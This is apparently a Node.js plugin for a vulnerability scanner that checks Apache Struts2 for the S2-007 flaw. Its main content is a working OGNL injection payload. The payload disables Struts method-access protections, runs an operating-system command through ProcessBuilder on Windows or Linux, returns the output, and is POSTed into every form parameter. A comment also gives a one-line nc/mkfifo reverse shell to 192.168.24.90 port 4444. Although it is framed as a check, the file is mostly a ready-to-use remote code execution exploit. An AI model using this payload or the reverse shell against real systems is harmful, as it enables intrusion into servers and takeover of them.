module.exports={
	tags:"struts2,007,ww-3668,3668,parms",
	des:"WW-3668,struts2 007漏洞检测",
	VulApps:[
		"https://github.com/vulhub/vulhub/tree/master/struts2/s2-007",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-007.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-007",
		"https://issues.apache.org/jira/browse/WW-3668"],
	suport:g_szMyMsg,
/*
一行反弹shell:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.24.90 4444 >/tmp/f
*/
	doCheck:function (url,fnCbk,parms)
	{
		var _t = this;
		var s = "'+(#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
		+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
		+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
		+ ",#p=new java.lang.ProcessBuilder(#cmds)"
		+ ",#as=new java.lang.String()"
		+ ",#p.redirectErrorStream(true),#process=#p.start()"
		+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
		+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+")+'";
		parms || (parms = {});
		var a = '';
		for(var k in parms)
		{
			parms[k] = s;
			a = k + "=" + encodeURIComponent(s) + "&";
		}
		// console.log(parms);
		request(fnOptHeader({method: 'POST',uri: url,// + "?" + a,
			"formData":parms
		    ,headers:
		    {
		    	"User-Agent": g_szUa,
		    	"Content-Type":"application/x-www-form-urlencoded"
		    }})
		  ,function (error, response, body)
		  {
		  		if(body)
		  		{
		  			body = body.replace(/\u0000/gmi, '');
		  			// console.log(body);
		  			fnDoBody(body,"s2-007",url,null,function(o)
		  			{
		  				var r = {"url":url,"send":s};
  						fnCbk(global.copyO2O(r,o),_t);
		  			});
		  		}
		    });
	}
};